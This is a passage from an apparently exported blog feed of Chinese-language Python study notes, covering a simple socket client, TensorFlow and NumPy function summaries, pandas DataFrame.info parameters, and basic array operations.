class="comment">#生成一个socket对象</span></span><br><span class="line">sk = socket.socket()</span><br><span class="line"><span class="comment">#请求连接服务端</span></span><br><span class="line">sk.connect(ip_port)</span><br><span class="line"><span class="comment">#发送数据</span></span><br><span class="line"><span class="comment">#也可写成sk.send("hello,服务器".encode("utf-8"))</span></span><br><span class="line">sk.send(bytes(<span class="string">"hello,服务器"</span>,<span class="string">"utf-8"</span>))</span><br><span class="line"><span class="comment">#接受数据</span></span><br><span class="line">server_reply = sk.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="comment">#打印接受的数据</span></span><br><span class="line"><span class="keyword">print</span> (server_reply.decode(<span class="string">"utf-8"</span>))</span><br><span class="line"><span class="comment">#关闭连接</span></span><br><span class="line">sk.close()</span><br></pre></td></tr></table></figure><h2 id="科学计算"><a href="#科学计算" class="headerlink" title="科学计算"></a>科学计算</h2><p>tensorflow</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">常用函数</span><br><span class="line">全<span class="number">0</span>矩阵：tf.zeros(<span class="literal">[<span class="number">2</span>,<span class="number">3</span>]</span>,<span class="built_in">int32</span>)</span><br><span class="line">全<span class="number">1</span>矩阵：tf.ones(<span class="literal">[<span class="number">2</span>,<span class="number">3</span>]</span>,<span class="built_in">int32</span>)</span><br><span class="line">全为指定数字矩阵：tf.fill(<span class="literal">[<span class="number">2</span>,<span class="number">3</span>]</span>,<span class="number">9</span>)</span><br><span class="line">给定常量：tf.constant</span><br><span class="line">矩阵对应位置相乘：*</span><br><span class="line">矩阵变量：tf.Variable</span><br><span class="line">矩阵乘法：tf.matmul</span><br><span class="line">正态分布：tf.random_normal</span><br><span class="line">均匀分布：tf.random_uniform</span><br><span class="line">Gamma分布：tf.random_gamma</span><br><span class="line">限制张量值得范围：tf.clip<span class="constructor">_by_value(<span class="params">y</span>, 1e-10, 1.0)</span></span><br><span class="line"></span><br><span class="line">损失函数</span><br><span class="line">分类--交叉熵：corss_entropy = tf.nn.softmax<span class="constructor">_cross_entropy_with_logits(<span class="params">labels</span>=<span class="params">y_</span>,<span class="params">logits</span>=<span class="params">y</span>)</span></span><br><span class="line">回归--均方误差：mse = tf.reduce<span class="constructor">_mean(<span class="params">tf</span>.<span class="params">square</span>(<span class="params">y_</span>-<span class="params">y</span>)</span>)</span><br><span class="line"></span><br><span class="line">正则化函数</span><br><span class="line">L1正则化：tf.contrib.layers.l1<span class="constructor">_regularizer(<span class="params">lambda</span>)</span>(w)</span><br><span class="line">L2正则化：tf.contrib.layers.l2<span class="constructor">_regularizer(<span class="params">lambda</span>)</span>(w)</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>人点赞</span><br><span class="line">tensorflow</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">作者：JianjinL</span><br><span class="line">链接：https:<span class="comment">//www.jianshu.com/p/d295203a7148</span></span><br><span class="line">来源：简书</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure><h2 id="python——base"><a href="#python——base" class="headerlink" title="python——base"></a>python——base</h2><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span><span class="params">(a)</span>:</span>   <span class="comment">#b继承a</span></span><br></pre></td></tr></table></figure><h3 id="解决Scripts-文件夹下没有pip-exe文件"><a href="#解决Scripts-文件夹下没有pip-exe文件" class="headerlink" title="解决Scripts 文件夹下没有pip.exe文件"></a>解决Scripts 文件夹下没有pip.exe文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m ensurepip</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python/package_function</title>
      <link href="python/package_function/"/>
      <url>python/package_function/</url>
      
        <content type="html"><![CDATA[<h1 id="package"><a href="#package" class="headerlink" title="package"></a>package</h1><a id="more"></a><p>记录一下 常用的包函数  </p><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">math.pow(<span class="symbol">x</span>,<span class="symbol">y</span>) 返回<span class="symbol">x</span>的<span class="symbol">y</span>次方的值</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python/Numpy</title>
      <link href="python/Numpy/"/>
      <url>python/Numpy/</url>
      
        <content type="html"><![CDATA[<p>typora-root-url: ..</p><h1 id="科学计算"><a href="#科学计算" class="headerlink" title="科学计算"></a>科学计算</h1><a id="more"></a><h2 id="NumPy"><a href="#NumPy" class="headerlink" title="NumPy"></a>NumPy</h2><p>NumPy中的<strong>基本数据类型</strong></p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>bool</td><td>用一个字节存储的布尔类型（True或False）</td></tr><tr><td>inti</td><td>由所在平台决定其大小的整数（一般为int32或int64）</td></tr><tr><td>int8/16/32/64</td><td>整数，1/2/4/8个字节大小</td></tr><tr><td>uint8/16/32/64</td><td>无符号整数</td></tr><tr><td>float16/32/64</td><td>半/单/双精度浮点数，16/32/64位，指数、精度也不同</td></tr><tr><td>complex64/128</td><td>复数，分别用两个32/64位浮点数表示实部和虚部</td></tr></tbody></table><h3 id="info-函数"><a href="#info-函数" class="headerlink" title="info()函数"></a>info()函数</h3><p> info()函数用于打印DataFrame的简要摘要，显示有关DataFrame的信息，包括索引的数据类型dtype和列的数据类型dtype，非空值的数量和内存使用情况。</p><p>DataFrame.info <strong>(self, verbose=None, buf=None, max_cols=None, memory_usage=None, null_counts=None)</strong></p><table><thead><tr><th>Parameters</th><th>Value</th></tr></thead><tbody><tr><td><strong>self</strong></td><td>self只有在类的方法中才会有，其他函数或方法是不必带self的。有关self的更多内容，指路→ \to→<a href="https://www.cnblogs.com/huangbiquan/p/7741016.html" target="_blank" rel="noopener">https://www.cnblogs.com/huangbiquan/p/7741016.html</a></td></tr><tr><td><strong>verbose</strong>：bool, optional</td><td>“verbose”中文译为“冗长的”，该参数决定<strong>是否打印完整的摘要</strong>。如果为True，显示所有列的信息；如果为False，那么会省略一部分。<strong>默认情况下，</strong>遵循pandas.options.display.max_info_columns中的设置。</td></tr><tr><td><strong>buf</strong>：writable buffer, defaults to sys.stdout</td><td>该参数决定<strong>将输出发送到哪里</strong>。<strong>默认情况下，</strong> 输出打印到sys.stdout。如果需要进一步处理输出，请传递可写缓冲区。可将DataFrame.info()存储为变量，指路→ \to→<a href="https://blog.csdn.net/qq_34105362/article/details/90056765。" target="_blank" rel="noopener">https://blog.csdn.net/qq_34105362/article/details/90056765。</a></td></tr><tr><td><strong>max_col</strong>：sint, optional</td><td>该参数使得<strong>从“详细输出”转换为“缩减输出”</strong>，如果DataFrame的列数超过max_cols，则缩减输出。<strong>默认情况下，</strong> 使用pandas.options.display.max_info_columns中的设置。</td></tr><tr><td><strong>memory_usage</strong>：bool, str, optional</td><td>该参数决定<strong>是否应显示DataFrame元素（包括索引）的总内存使用情况</strong>。<strong>默认情况下为True。</strong> True始终显示内存使用情况；False永远不会显示内存使用情况。</td></tr><tr><td><strong>null_counts</strong>：bool, optional</td><td>该参数决定<strong>是否显示非空计数</strong>。值为True始终显示计数，而值为False则不显示计数。<strong>默认情况下，</strong> 仅当Dataframe小于pandas.options.display.max_info_rows和pandas.options.display.max_info_columns时才显示。</td></tr></tbody></table><p>在csv数据集建立数据集对象时可以用来查看数据集对象的信息】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">test_data = pd.read_csv(<span class="string">r'D:\program\python\ai_program\example_data_csv\Titanic\test_data.csv'</span>)</span><br><span class="line">test_data.info()</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">pandas</span>.<span class="title">core</span>.<span class="title">frame</span>.<span class="title">DataFrame</span>'&gt;</span></span><br><span class="line"><span class="class"><span class="title">RangeIndex</span>:</span> <span class="number">100</span> entries, <span class="number">0</span> to <span class="number">99</span></span><br><span class="line">Data columns (total <span class="number">17</span> columns):</span><br><span class="line"> <span class="comment">#   Column       Non-Null Count  Dtype  </span></span><br><span class="line">---  ------       --------------  -----  </span><br><span class="line"> <span class="number">0</span>   Unnamed: <span class="number">0</span>   <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">1</span>   PassengerId  <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">2</span>   Survived     <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">3</span>   Sex          <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">4</span>   Age          <span class="number">100</span> non-null    float64</span><br><span class="line"> <span class="number">5</span>   Fare         <span class="number">100</span> non-null    float64</span><br><span class="line"> <span class="number">6</span>   Pclass_1     <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">7</span>   Pclass_2     <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">8</span>   Pclass_3     <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">9</span>   Family_size  <span class="number">100</span> non-null    float64</span><br><span class="line"> <span class="number">10</span>  Title_1      <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">11</span>  Title_2      <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">12</span>  Title_3      <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">13</span>  Title_4      <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">14</span>  Emb_1        <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">15</span>  Emb_2        <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">16</span>  Emb_3        <span class="number">100</span> non-null    int64  </span><br><span class="line">dtypes: float64(<span class="number">3</span>), int64(<span class="number">14</span>)</span><br></pre></td></tr></table></figure><h3 id="ndarray"><a href="#ndarray" class="headerlink" title="ndarray"></a>ndarray</h3><p>多维数组对象  （元素类型相同）</p><p>np.arry()生成一个ndarray数组， </p><p><img src="/images/Numpy/image-20200406193440690.png" alt="image-20200406193440690"></p><p>ndarry仅支持整数，浮点数和负数三种类型</p><p>shape 功能为查看矩阵或者数组的维数</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">x</span> = np.<span class="meta">array</span>(<span class="meta">list</span>/tuple)</span><br><span class="line"></span><br><span class="line"><span class="meta">x</span> = np.<span class="meta">array</span>(<span class="meta">list</span>/tuple,dtype=np.float32)</span><br></pre></td></tr></table></figure><p>生成均匀分布的array：<br>arange（最小值，最大值，步长）（左闭右开） : 创建等差数列<br>linspace（最小值，最大值，元素数量）<br>logspace(开始值, 终值, 元素个数): 创建等比数列、</p><p><code>np.ones</code>: 创建一个数组, 其中的元素全为 1<br><code>np.zeros</code>: 创建元素全为 0 的数组, 类似 np.ones<br><code>np.empty</code>创建一个内容随机并且依赖与内存状态的数组。<br><code>np.eye</code>: 创建一个对角线为 1 其他为 0 的矩阵.<br><code>np.identity</code>: 创建一个主对角线为 1 其他为 0 的方阵.</p><p><img src="/images/Numpy/image-20200408175853045.png" alt="image-20200408175853045"></p><p><img src="/images/Numpy/image-20200408175946155.png" alt="image-20200408175946155"></p><h4 id="获取数组的属性"><a href="#获取数组的属性" class="headerlink" title="获取数组的属性"></a>获取数组的属性</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.zeros((<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[[<span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">        [<span class="number">0.</span>, <span class="number">0.</span>]],</span><br><span class="line"></span><br><span class="line">       [[<span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">        [<span class="number">0.</span>, <span class="number">0.</span>]]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.ndim</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.shape</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">'s'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.shape</span><br><span class="line">(<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.size  <span class="comment">#数组全部元素的数量</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.dtype  <span class="comment">#数组中元素的类型</span></span><br><span class="line">dtype(<span class="string">'float64'</span>)</span><br></pre></td></tr></table></figure><h4 id="数组索引，切片，赋值"><a href="#数组索引，切片，赋值" class="headerlink" title="数组索引，切片，赋值"></a>数组索引，切片，赋值</h4><p>‘…’符号表示将所有未指定索引的维度均赋为 ‘：’<br>‘：’在python中表示该维所有元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">6</span>]&gt;&gt;&gt; a = np.array([[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">       [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">1</span>,:]</span><br><span class="line">array([<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(a[<span class="number">1</span>,<span class="number">1</span>:<span class="number">2</span>])</span><br><span class="line">[<span class="number">6</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">1</span>,:] =  [<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[ <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>],</span><br><span class="line">       [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>]])&gt;&gt;&gt; <span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x,y)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="number">10</span>*x+y</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = np.fromfunction(f,(<span class="number">5</span>,<span class="number">4</span>),dtype = int)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">       [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>],</span><br><span class="line">       [<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>],</span><br><span class="line">       [<span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>],</span><br><span class="line">       [<span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x,y)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="number">10</span>*x+y</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = np.fromfunction(f,(<span class="number">5</span>,<span class="number">4</span>),dtype = int)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">       [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>],</span><br><span class="line">       [<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>],</span><br><span class="line">       [<span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>],</span><br><span class="line">       [<span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>]])</span><br></pre></td></tr></table></figure><h4 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a =  np.ones((<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[<span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">1.</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = np.eye(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">array([[<span class="number">1.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">1.</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a &gt;<span class="number">2</span></span><br><span class="line">array([[<span class="literal">False</span>, <span class="literal">False</span>],</span><br><span class="line">       [<span class="literal">False</span>, <span class="literal">False</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b &gt;<span class="number">1</span></span><br><span class="line">array([[<span class="literal">False</span>, <span class="literal">False</span>],</span><br><span class="line">       [<span class="literal">False</span>, <span class="literal">False</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a-b</span><br><span class="line">array([[<span class="number">0.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">0.</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a+b</span><br><span class="line">array([[<span class="number">2.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">2.</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b*<span class="number">2</span></span><br><span class="line">array([[<span class="number">2.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">2.</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(a*<span class="number">2</span>)*(b*<span class="number">2</span>)</span><br><span class="line">array([[<span class="number">4.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">4.</span>]])</span><br><span class="line"> b/(a*<span class="number">2</span>) <span class="comment">#数组与数组相除，按位置一对一相除</span></span><br><span class="line">array([[<span class="number">0.5</span>, <span class="number">0.</span> ],</span><br><span class="line">       [<span class="number">0.</span> , <span class="number">0.5</span>]])</span><br><span class="line">a.dot(b)                    <span class="comment"># matrix product，矩阵乘</span></span><br><span class="line">array([[<span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">1.</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b =a</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b <span class="keyword">is</span> a  <span class="comment">#浅拷贝</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = a.copy()<span class="comment">#深拷贝</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c <span class="keyword">is</span> a</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.sin(a)</span><br><span class="line">array([[ <span class="number">0.84147098</span>,  <span class="number">0.84147098</span>],</span><br><span class="line">       [ <span class="number">0.84147098</span>,  <span class="number">0.84147098</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.max(a)</span><br><span class="line"><span class="number">1.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.floor(a)  </span><br><span class="line">array([[ <span class="number">1.</span>,  <span class="number">1.</span>],</span><br><span class="line">       [ <span class="number">1.</span>,  <span class="number">1.</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.exp(a)               <span class="comment">#e^x</span></span><br><span class="line">array([[ <span class="number">2.71828183</span>,  <span class="number">2.71828183</span>],</span><br><span class="line">       [ <span class="number">2.71828183</span>,  <span class="number">2.71828183</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(np.vstack((a,b)))   <span class="comment">#合并数组</span></span><br><span class="line">[[ <span class="number">1.</span>  <span class="number">1.</span>] </span><br><span class="line"> [ <span class="number">1.</span>  <span class="number">1.</span>]</span><br><span class="line"> [ <span class="number">1.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">0.</span>  <span class="number">1.</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(np.hstack((a,b)))   <span class="comment">#合并数组</span></span><br><span class="line">[[ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">0.</span>]</span><br><span class="line"> [ <span class="number">1.</span>  <span class="number">1.</span>  <span class="number">0.</span>  <span class="number">1.</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(a.transpose())       <span class="comment">#转置</span></span><br></pre></td></tr></table></figure><hr><p>numpy.linalg模块中有很多关于矩阵运算的方法</p><h3 id="mean"><a href="#mean" class="headerlink" title="mean"></a>mean</h3><p>define:</p><p><strong>numpy.mean</strong> ( a, axis=None, dtype=None, out=None, keepdims=&lt;class numpy._globals._NoValue at 0x40b6a26c&gt; )</p><p>  mean()函数功能：求取均值</p><p>经常操作的参数为axis，以m * n矩阵举例：</p><p>axis 不设置值，对 m*n 个数求均值，返回一个实数</p><p>axis = 0：压缩行，对各列求均值，返回 1* n 矩阵</p><p>axis =1 ：压缩列，对各行求均值，返回 m *1 矩阵</p><h3 id="二元函数"><a href="#二元函数" class="headerlink" title="二元函数"></a>二元函数</h3><p><img src="/images/Numpy/image-20200408181331498.png" alt="image-20200408181331498"></p><h3 id="CSV-文件"><a href="#CSV-文件" class="headerlink" title="CSV 文件"></a>CSV 文件</h3><p>用来存储批量文件</p><p><img src="/images/Numpy/image-20200408202827814.png" alt="image-20200408202827814"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.savetxt(frame,arry,<span class="attribute">fmt</span>=<span class="string">'%.18e'</span>, <span class="attribute">delimiter</span>=None)</span><br></pre></td></tr></table></figure><p><img src="/images/Numpy/image-20200408203216749.png" alt="image-20200408203216749"></p><p><img src="/images/Numpy/image-20200408204735471.png" alt="image-20200408204735471"></p><p><img src="/images/Numpy/image-20200408205425758.png" alt="image-20200408205425758"></p><h3 id="随机数函数字库"><a href="#随机数函数字库" class="headerlink" title="随机数函数字库"></a>随机数函数字库</h3><p><img src="/images/Numpy/image-20200409094640413.png" alt="image-20200409094640413"></p><p><img src="/images/Numpy/image-20200409095240039.png" alt="image-20200409095240039"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">sn = np.random.randn(<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">print(sn)</span><br><span class="line"></span><br><span class="line">b = np.random.randint(<span class="number">100</span>, <span class="number">200</span>,(<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">10</span>)</span><br><span class="line">b = np.random.randint(<span class="number">100</span>,<span class="number">200</span>,(<span class="number">3</span>,<span class="number">4</span>))    </span><br><span class="line">print(b)</span><br><span class="line">print(<span class="string">"-------random 2"</span>)</span><br><span class="line">a = np.random.randint(<span class="number">100</span>,<span class="number">200</span>,(<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line">print(a)</span><br><span class="line">np.random.shuffle(a)</span><br><span class="line">print(a)</span><br><span class="line">np.random.shuffle(a)</span><br><span class="line">print(a)</span><br><span class="line">np.random.permutation(a)</span><br><span class="line">print(a)</span><br><span class="line">print(<span class="string">"---------choice"</span>)</span><br><span class="line">b = np.random.randint(<span class="number">100</span>,<span class="number">200</span>,(<span class="number">8</span>,))     </span><br><span class="line">print(b)</span><br><span class="line">np.random.choice(b,(<span class="number">3</span>,<span class="number">2</span>))</span><br><span class="line">print(b)</span><br><span class="line">np.random.choice(b,(<span class="number">3</span>,<span class="number">2</span>),replace=<span class="literal">False</span>)</span><br><span class="line">print(b)</span><br><span 